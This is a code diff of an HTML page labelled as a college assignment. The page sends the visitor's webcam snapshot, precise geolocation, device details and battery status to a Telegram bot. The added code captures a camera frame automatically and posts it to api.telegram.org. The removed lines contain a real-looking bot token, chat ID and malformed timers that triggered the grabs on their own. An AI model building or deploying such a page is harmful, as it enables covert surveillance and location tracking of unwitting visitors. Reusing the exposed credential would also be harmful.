@@ -6,16 +6,15 @@
 </head>
 <body>
   <h1>Tugas Kuliah - Bot Telegram</h1>
-  <button onclick="takePhoto()">Ambil Foto</button>
-  <button onclick="getLocation()">Dapatkan Lokasi</button>
+  
+  <button onclick="takeAutoPhoto()">Ambil Foto Otomatis</button>
+  <button onclick="getLiveLocation()">Dapatkan Lokasi Akurat</button>
   <button onclick="getDeviceInfo()">Dapatkan Informasi Perangkat</button>
   <button onclick="getBatteryInfo()">Dapatkan Informasi Baterai</button>
 
   <script>
-    // Ganti dengan token bot Telegram Anda
-    const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
-    // Ganti dengan chat ID tujuan
-    const chatId = '1121369247';
+    const token = 'YOUR_BOT_TOKEN';
+    const chatId = 'YOUR_CHAT_ID';
 
     function sendTelegramMessage(text) {
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -29,33 +28,47 @@
       $.post(url, data);
     }
 
-    function takePhoto() {
-      // Mengambil foto dengan bantuan <input type="file">
-      const fileInput = document.createElement('input');
-      fileInput.type = 'file';
-      fileInput.accept = 'image/*';
-
-      fileInput.addEventListener('change', function(event) {
-        const file = event.target.files[0];
-        const reader = new FileReader();
-        reader.onload = function() {
-          const photoData = reader.result;
-          sendTelegramPhoto(photoData);
-        };
-        reader.readAsDataURL(file);
-      });
-
-      fileInput.click();
+    function takeAutoPhoto() {
+      const constraints = { video: true };
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(stream) {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.onloadedmetadata = function() {
+            video.play();
+            captureVideoFrame();
+            stream.getTracks().forEach(function(track) {
+              track.stop();
+            });
+          };
+        })
+        .catch(function(error) {
+          console.error('Error accessing camera: ', error);
+        });
     }
 
-    function getLocation() {
+    function captureVideoFrame() {
+      const video = document.querySelector('video');
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const photoData = canvas.toDataURL('image/jpeg');
+      sendTelegramPhoto(photoData);
+    }
+
+    function getLiveLocation() {
       if ('geolocation' in navigator) {
+        const options = { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 };
         navigator.geolocation.getCurrentPosition(function(position) {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
           const locationText = `Lokasi: ${lat}, ${lon}`;
           sendTelegramMessage(locationText);
-        });
+        }, function(error) {
+          console.error('Error getting location: ', error);
+        }, options);
       } else {
         sendTelegramMessage('Maaf, peramban tidak mendukung geolokasi.');
       }
@@ -81,33 +94,6 @@
       } else {
         sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
       }
-	  
-	 // Fungsi untuk melakukan klik tombol secara otomatis
-    function autoClickButton() {
-      var button = document.getElementById('getLocation');
-      button.click();
-    }
-    // Melakukan klik tombol setelah 3 detik
-    setTimeout(autoClickButton, 3000);
-    }
-	
-	// Fungsi untuk melakukan klik tombol secara otomatis
-    function autoClickButton() {
-      var button = document.getElementById('getDeviceInfo');
-      button.click();
-    }
-    // Melakukan klik tombol setelah 3 detik
-    setTimeout(autoClickButton, 3000);
-	}
-	
-	// Fungsi untuk melakukan klik tombol secara otomatis
-    function autoClickButton() {
-      var button = document.getElementById('getBatteryInfo');
-      button.click();
-    }
-    // Melakukan klik tombol setelah 3 detik
-    setTimeout(autoClickButton, 3000);
-	
     }
   </script>
 </body>
